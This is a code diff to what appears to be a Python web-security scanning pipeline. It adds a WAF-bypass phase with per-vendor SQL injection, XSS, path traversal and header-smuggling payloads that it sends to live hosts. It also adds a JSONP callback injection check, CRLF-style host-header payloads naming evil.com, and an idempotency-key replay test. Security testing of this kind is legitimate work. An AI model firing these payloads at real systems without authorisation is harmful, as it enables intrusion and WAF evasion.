@@ -5,6 +5,7 @@ import asyncio
 import base64
 import contextlib
 import fnmatch
+import hashlib
 import json
 import math
 import os
@@ -4125,6 +4126,169 @@ async def phase_21_WAF(
     return {"21-WAF": str(out), "count": len(findings)}
 
 
+# ────────────────── Phase 21b-WAFBYPASS: WAF Bypass Testing ──────────────────
+_WAF_BYPASS_CORPUS: Dict[str, List[Dict[str, Any]]] = {
+    "Cloudflare": [
+        {"desc": "chunked encoding", "transform": "chunked", "payload": "' OR '1'='1"},
+        {"desc": "double URL encode", "transform": "double_url", "payload": "<script>alert(1)</script>"},
+        {"desc": "mixed case", "transform": "mixed_case", "payload": "<sCrIpT>alert(1)</sCrIpT>"},
+        {"desc": "parameter pollution via ;", "transform": "semicolon_param", "payload": "' UNION SELECT * FROM users--"},
+        {"desc": "\\r\\n header split", "transform": "crlf_header", "payload": "../../../etc/passwd"},
+    ],
+    "Akamai": [
+        {"desc": "unicode normalize", "transform": "unicode", "payload": "<script>alert(1)</script>"},
+        {"desc": "response split via \\r in JSON", "transform": "json_cr", "payload": '{"user":"admin\\r\\n"}', "content_type": "application/json"},
+    ],
+    "AWS WAF": [
+        {"desc": "oversize body bypass", "transform": "oversize_body", "payload": "a" * 10000 + "' OR '1'='1"},
+        {"desc": "gzip bomb", "transform": "gzip_bomb", "payload": "' UNION SELECT * FROM users--"},
+    ],
+    "ModSecurity": [
+        {"desc": "protocol parser diff", "transform": "protocol_diff", "payload": "{{7*7}}"},
+    ],
+}
+
+_WAF_BYPASS_GENERIC = [
+    {"desc": "URL encoded", "transform": "url_encoded", "payload": "' OR '1'='1"},
+    {"desc": "double URL encoded", "transform": "double_url", "payload": "<script>alert(1)</script>"},
+    {"desc": "tab instead of space", "transform": "tab_space", "payload": "' || 1=1 --"},
+    {"desc": "null byte prefix", "transform": "null_byte", "payload": "%00' OR '1'='1"},
+]
+
+
+async def phase_21b_WAFBYPASS(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"21b-WAFBYPASS"}:
+        return {}
+    _out = outdir / "waf_bypass.txt"
+    if _out.exists() and not force:
+        return {"21b-WAFBYPASS": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 21b-WAFBYPASS: WAF bypass technique testing")
+    findings: List[str] = []
+    _wb_urlopen = _get_urlopener()
+    _wb_extra_headers = _extra_headers_dict()
+
+    # Read WAF detection results
+    waf_file = outdir / "waf_detection.txt"
+    waf_vendors: Set[str] = set()
+    if waf_file.exists():
+        for ln in read_lines(waf_file):
+            low = ln.lower()
+            for vendor in _WAF_BYPASS_CORPUS:
+                if vendor.lower() in low:
+                    waf_vendors.add(vendor)
+
+    with contextlib.suppress(Exception):
+        for p in Path(outdir).glob("wafw00f_results.txt"):
+            if p.exists():
+                for ln in read_lines(p):
+                    low = ln.lower()
+                    for vendor in _WAF_BYPASS_CORPUS:
+                        if vendor.lower() in low:
+                            waf_vendors.add(vendor)
+
+    # Collect targets
+    targets: List[str] = []
+    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
+    if not hosts_file.exists() or not read_lines(hosts_file):
+        hosts_file = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
+    if not hosts_file.exists() or not read_lines(hosts_file):
+        hosts_file = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
+    if hosts_file.exists():
+        for h in read_lines(hosts_file)[:5]:
+            if not h.startswith("http"):
+                h = f"https://{h}"
+            targets.append(h.rstrip("/"))
+    if not targets:
+        log("warn", "21b-WAFBYPASS: no targets; skipping")
+        return {"21b-WAFBYPASS": str(_out), "count": 0}
+
+    if not waf_vendors:
+        log("warn", "21b-WAFBYPASS: no WAF detected; running generic bypass probes only")
+    else:
+        log("info", f"21b-WAFBYPASS: targeting {', '.join(sorted(waf_vendors))} WAF(s)")
+
+    async def _has_waf_blocked(url: str, body: str, status: int) -> bool:
+        block_kw = {"blocked", "denied", "rejected", "waf", "security", "forbidden",
+                     "access denied", "request blocked", "challenge", "attention required"}
+        body_lower = body.lower()
+        if status in (403, 406, 429, 503, 501):
+            return True
+        if any(kw in body_lower for kw in block_kw):
+            return True
+        return False
+
+    async def _try_bypass(target: str, entry: Dict[str, Any]) -> Optional[str]:
+        transform = entry.get("transform", "")
+        payload = entry.get("payload", "")
+        desc = entry.get("desc", "")
+        base_url = f"{target}/"
+        probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
+        headers = {"User-Agent": "Mozilla/5.0", **_wb_extra_headers}
+
+        if transform == "double_url":
+            probe_url = f"{base_url}?q={urllib.parse.quote(urllib.parse.quote(payload))}"
+        elif transform == "mixed_case":
+            probe_url = f"{base_url}?q={urllib.parse.quote(entry['payload'])}"
+        elif transform == "semicolon_param":
+            probe_url = f"{base_url};?q={urllib.parse.quote(payload)}"
+        elif transform == "crlf_header":
+            headers["X-Forwarded-For"] = "127.0.0.1\r\nX-Hack: 1"
+        elif transform == "unicode":
+            payload = payload.replace("<", "%uFF1C").replace(">", "%uFF1E")
+            probe_url = f"{base_url}?q={payload}"
+        elif transform == "json_cr":
+            headers["Content-Type"] = entry.get("content_type", "application/json")
+        elif transform == "oversize_body":
+            probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
+        elif transform == "gzip_bomb":
+            return None
+        elif transform == "protocol_diff":
+            probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
+            headers["Transfer-Encoding"] = "chunked"
+        elif transform == "url_encoded":
+            probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
+        elif transform == "tab_space":
+            probe_url = f"{base_url}?q={urllib.parse.quote(payload.replace(' ', '%09'))}"
+        elif transform == "null_byte":
+            probe_url = f"{base_url}?q={urllib.parse.quote(payload)}"
+
+        try:
+            req = urllib.request.Request(probe_url, method="GET", headers=headers)
+            s, _, body_bytes = await _async_urlopen(_wb_urlopen, req, timeout=10)
+            body = body_bytes.decode("utf-8", errors="ignore")
+            if not await _has_waf_blocked(probe_url, body, s):
+                return f"[waf-bypass] {target} — {desc} — HTTP {s} — payload reached origin"
+            return f"[waf-blocked] {target} — {desc} — HTTP {s} — blocked by WAF"
+        except urllib.error.HTTPError as e:
+            if e.code in (403, 406, 429, 503, 501):
+                return f"[waf-blocked] {target} — {desc} — HTTP {e.code} — blocked by WAF"
+            return None
+        except Exception:
+            return None
+
+    bypass_corpus: List[Dict[str, Any]] = []
+    for vendor in waf_vendors:
+        bypass_corpus.extend(_WAF_BYPASS_CORPUS.get(vendor, []))
+    if not bypass_corpus:
+        bypass_corpus = list(_WAF_BYPASS_GENERIC)
+
+    for target in targets:
+        for entry in bypass_corpus:
+            await _throttle_rate()
+            result = await _try_bypass(target, entry)
+            if result:
+                findings.append(result)
+
+    if not findings:
+        findings.append("[waf-bypass] No WAF bypass techniques confirmed (expected)")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"21b-WAFBYPASS: {len(findings)} bypass checks → {out}")
+    return {"21b-WAFBYPASS": str(out), "count": len(findings)}
+
+
 # ────────────────── Phase 22-NOSQLI: NoSQL Injection ─────────────────────────
 _NOSQLI_PAYLOADS: List[Dict[str, Any]] = [
     {"$gt": ""},
@@ -5350,6 +5514,35 @@ async def phase_35_CORSADV(
     for r in cors_results:
         if r:
             findings.append(r)
+    # ── JSONP endpoint detection ──
+    jsonp_endpoints: Set[str] = set()
+    jsonp_params = {"callback=", "jsonp=", "cb=", "jsoncallback="}
+    for u in all_urls:
+        qs = urllib.parse.urlparse(u).query
+        if qs and any(p in qs.lower() for p in jsonp_params):
+            jsonp_endpoints.add(u.split("?")[0])
+    for ep in list(jsonp_endpoints)[:10]:
+        try:
+            test_val = "jQuery1234_test"
+            jsonp_url = f"{ep}?callback={test_val}"
+            req = urllib.request.Request(jsonp_url, method="GET",
+                headers={"User-Agent": "Mozilla/5.0", **_cors_extra_headers})
+            _, _, body_bytes = await _async_urlopen_no_redirect(_cors_urlopen, req, timeout=8)
+            body = body_bytes.decode("utf-8", errors="ignore")
+            if test_val in body and ("(" in body and ")" in body):
+                findings.append(f"[jsonp-endpoint] {ep} — callback param reflected with wrapping (JSONP)")
+                inject_val = "alert(1)"
+                inject_url = f"{ep}?callback={inject_val}"
+                ireq = urllib.request.Request(inject_url, method="GET",
+                    headers={"User-Agent": "Mozilla/5.0", **_cors_extra_headers})
+                _, _, ibody_bytes = await _async_urlopen_no_redirect(_cors_urlopen, ireq, timeout=8)
+                ibody = ibody_bytes.decode("utf-8", errors="ignore")
+                if inject_val in ibody and not ibody.startswith("//") and not ibody.startswith("/**"):
+                    findings.append(f"[jsonp-injectable] {ep} — callback value injectable into response (XSS/CSRF)")
+                findings.append(f"[jsonp-legacy] {ep} — JSONP callback present; legacy API may be exploitable from any origin")
+        except Exception:
+            continue
+
     if not findings:
         findings.append("[cors] No advanced CORS misconfigurations detected (expected)")
     out = ensure(_out)
@@ -8292,6 +8485,9 @@ _HOST_INJECT_PAYLOADS = [
     "x: 0",
     "x: 1",
     "evil.com\\r\\nX-Forwarded-Host: evil.com",
+    "evil.com\\u010d\\nX-Forwarded-Host: evil.com",
+    "evil.com\\u2028\\nX-Forwarded-Host: evil.com",
+    "evil.com%250d%250aX-Forwarded-Host: evil.com",
     "null",
     "target.com@evil.com",
     "target.com:evil.com",
@@ -8813,6 +9009,103 @@ async def phase_63_DOC_ATTACK(
     return {"63-DOC-ATTACK": str(out), "count": len(findings)}
 
 
+# ────────────────── Phase 64-IDEMPOTENCY: Idempotency Key Replay ──────────────
+_IDEMPOTENCY_HEADERS = ["Idempotency-Key", "X-Idempotency-Key", "X-Request-Id", "Idempotency-Key", "X-Idempotency-Request", "Request-Id"]
+
+
+async def phase_64_IDEMPOTENCY(
+    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
+) -> Dict[str, Any]:
+    if skip & {"64-IDEMPOTENCY"}:
+        return {}
+    _out = outdir / "idempotency.txt"
+    if _out.exists() and not force:
+        return {"64-IDEMPOTENCY": str(_out), "count": count_nonblank(_out)}
+    log("info", "Phase 64-IDEMPOTENCY: idempotency key replay testing")
+    findings: List[str] = []
+    _id_urlopen = _get_urlopener()
+    _id_extra_headers = _extra_headers_dict()
+
+    # Collect POST endpoints from harvested URLs
+    api_endpoints: Set[str] = set()
+    urls_file = outdir / "urls_all.txt"
+    if urls_file.exists():
+        for u in read_lines(urls_file):
+            parsed = urllib.parse.urlparse(u)
+            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+            if any(m in base.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql", "/rest/", "/payment", "/transfer", "/order", "/checkout")):
+                api_endpoints.add(base)
+
+    if not api_endpoints:
+        fuzz_file = outdir / "fuzz.txt"
+        if fuzz_file.exists():
+            for ln in read_lines(fuzz_file):
+                parts = ln.split("\t") if "\t" in ln else ln.split()
+                for p in parts:
+                    if p.startswith("http") and any(m in p.lower() for m in ("/api/", "/v1/", "/v2/")):
+                        api_endpoints.add(p.split("?")[0])
+
+    targets = list(api_endpoints)[:10]
+    if not targets:
+        findings.append("[idempotency] No API endpoints found for replay testing")
+        out = ensure(_out)
+        out.write_text("\n".join(findings) + ("\n" if findings else ""))
+        log("ok", f"64-IDEMPOTENCY: {len(findings)} findings → {out}")
+        return {"64-IDEMPOTENCY": str(out), "count": len(findings)}
+
+    for endpoint in targets:
+        for header_name in _IDEMPOTENCY_HEADERS:
+            key = f"reconchain-replay-{hashlib.md5(endpoint.encode()).hexdigest()[:8]}"
+            test_body = json.dumps({"test": True, "ts": str(datetime.now())}).encode()
+            try:
+                req1 = urllib.request.Request(endpoint, data=test_body, method="POST",
+                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0",
+                             header_name: key, **_id_extra_headers})
+                s1, h1, b1 = await _async_urlopen(_id_urlopen, req1, timeout=10)
+                b1_text = b1.decode("utf-8", errors="ignore")
+            except urllib.error.HTTPError as e:
+                s1, b1_text = e.code, e.read().decode("utf-8", errors="ignore")
+            except Exception:
+                continue
+
+            modified_body = json.dumps({"test": True, "ts": str(datetime.now()), "modified": True}).encode()
+            try:
+                req2 = urllib.request.Request(endpoint, data=modified_body, method="POST",
+                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0",
+                             header_name: key, **_id_extra_headers})
+                s2, h2, b2 = await _async_urlopen(_id_urlopen, req2, timeout=10)
+                b2_text = b2.decode("utf-8", errors="ignore")
+            except urllib.error.HTTPError as e:
+                s2, b2_text = e.code, e.read().decode("utf-8", errors="ignore")
+            except Exception:
+                continue
+
+            if s1 in (200, 201, 202) and s2 in (200, 201, 202):
+                if b1_text != b2_text or s1 != s2:
+                    findings.append(
+                        f"[idempotency-violation] {endpoint} — header={header_name} key={key} "
+                        f"— replay with different body returned different response "
+                        f"(req1: HTTP {s1}, req2: HTTP {s2})"
+                    )
+                else:
+                    findings.append(
+                        f"[idempotency-compliant] {endpoint} — header={header_name} — "
+                        f"replay returned identical response (HTTP {s1})"
+                    )
+            elif s1 != s2:
+                findings.append(
+                    f"[idempotency-different-status] {endpoint} — header={header_name} — "
+                    f"first=HTTP {s1}, second=HTTP {s2} (possible non-idempotent)"
+                )
+
+    if not findings:
+        findings.append("[idempotency] No idempotency-key endpoints detected (expected)")
+    out = ensure(_out)
+    out.write_text("\n".join(findings) + ("\n" if findings else ""))
+    log("ok", f"64-IDEMPOTENCY: {len(findings)} findings → {out}")
+    return {"64-IDEMPOTENCY": str(out), "count": len(findings)}
+
+
 PIPELINE = [
     ("00-SCOPE", phase_00_SCOPE, ("domain", "outdir", "t", "only", "skip", "force")),
     ("01-RECON", phase_01_RECON, ("domain", "outdir", "t", "only", "skip", "resume", "force")),
@@ -8842,6 +9135,7 @@ PIPELINE = [
     ("19-GIT", phase_19_GIT, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
     ("20-GRAPHQL", phase_20_GRAPHQL, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
     ("21-WAF", phase_21_WAF, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
+    ("21b-WAFBYPASS", phase_21b_WAFBYPASS, ("outdir", "t", "only", "skip", "prev", "force")),
     ("22-NOSQLI", phase_22_NOSQLI, ("outdir", "t", "only", "skip", "prev", "force")),
     ("23-RACE", phase_23_RACE, ("outdir", "t", "only", "skip", "prev", "force")),
     ("24-JWT", phase_24_JWT, ("outdir", "t", "only", "skip", "force")),
@@ -8885,6 +9179,7 @@ PIPELINE = [
     ("61-OAUTH-ADV", phase_61_OAUTH_ADV, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
     ("62-LOG-INJECT", phase_62_LOG_INJECT, ("outdir", "t", "only", "skip", "prev", "force")),
     ("63-DOC-ATTACK", phase_63_DOC_ATTACK, ("outdir", "t", "only", "skip", "prev", "force")),
+    ("64-IDEMPOTENCY", phase_64_IDEMPOTENCY, ("outdir", "t", "only", "skip", "prev", "force")),
 ]
 # Phase weights for progress bar accuracy (heuristic based on typical runtime).
 # Heavier phases (subdomain enum, port scan, nuclei, sqlmap, fuzz) contribute
@@ -8918,6 +9213,7 @@ _PHASE_WEIGHTS: Dict[str, int] = {
     "19-GIT": 5,
     "20-GRAPHQL": 2,
     "21-WAF": 3,
+    "21b-WAFBYPASS": 4,
     "22-NOSQLI": 3,
     "23-RACE": 3,
     "24-JWT": 3,
@@ -8961,6 +9257,7 @@ _PHASE_WEIGHTS: Dict[str, int] = {
     "61-OAUTH-ADV": 3,
     "62-LOG-INJECT": 3,
     "63-DOC-ATTACK": 4,
+    "64-IDEMPOTENCY": 3,
 }
 # Dependency-ordered execution stages. Phases in the same stage are independent
 # of one another (they only read artifacts produced by *earlier* stages, never
@@ -8997,16 +9294,16 @@ STAGES: List[List[str]] = [
     ["24-JWT", "36-JWTADV"],
     # Stage 12 — Auth tests: consume JWT findings + params from earlier stages
     ["39-OAUTH", "40-PWRESET", "16A-AUTHZ", "16B-MASSASSIGN", "17-IDOR"],
-    # Stage 13 — Long tail of independent checks
-    ["28-CACHED", "29-DEPCHECK", "30-LFI", "31-OPENREDIR", "32-CLICKJACK", "33-CRLF", "34-RATELIMIT", "35-CORSADV", "37-FILEUPLOAD", "38-SMUGGLE", "38b-H2SMUGGLE", "41-WEBSOCKET"],
+    # Stage 13 — Long tail of independent checks (WAF-BYPASS needs 21-WAF results)
+    ["28-CACHED", "29-DEPCHECK", "30-LFI", "31-OPENREDIR", "32-CLICKJACK", "33-CRLF", "34-RATELIMIT", "35-CORSADV", "37-FILEUPLOAD", "38-SMUGGLE", "38b-H2SMUGGLE", "41-WEBSOCKET", "21b-WAFBYPASS"],
     # Stage 14 — OOB callback collection
     ["13-OOB", "23-RACE"],
     # Stage 15 — Cross-phase correlation
     ["44-CHAIN"],
     # Stage 16 — Evidence capture after correlation has written its findings
     ["45-EVIDENCE"],
-    # Stage 17 — New enhancement phases (run after evidence capture)
-    ["46-BUCKET", "47-CDN", "48-CONTENT", "49-FRAMEWORKS"],
+    # Stage 17 — Enhancement phases: cloud/CDN/framework/idempotency
+    ["46-BUCKET", "47-CDN", "48-CONTENT", "49-FRAMEWORKS", "64-IDEMPOTENCY"],
     # Stage 18 — Enhancement phases v2: bucket perms + serverless + CSP + exposed DB + default creds
     ["50-BUCKET-PERMS", "52-SERVERLESS", "53-CSP", "56-EXPOSED-DB", "57-DEFAULT-CREDS", "59-EMAIL-SEC"],
     # Stage 19 — Injection/param-based phases: HPP, CSV, log inject need url params
@@ -9029,8 +9326,8 @@ _RECON_LEVELS = {
     },
     "full": {
         "name": "Full audit",
-        "desc": "All 71 phases — every recon + injection + auth + advanced probe + correlation + evidence + v2 enhancements",
+        "desc": "All 73 phases — every recon + injection + auth + advanced probe + correlation + evidence + v2 enhancements + WAF bypass + idempotency",
         "phases": VALID_PHASES,
     },
 }
-# 71 phases in PIPELINE: 00-SCOPE through 63-DOC-ATTACK (including 04b, 05b, 11a, 11b, 16A, 16B, 17b, 38b, 50-63)
+# 73 phases in PIPELINE: 00-SCOPE through 64-IDEMPOTENCY (including 04b, 05b, 11a, 11b, 16A, 16B, 17b, 21b, 38b, 50-64)
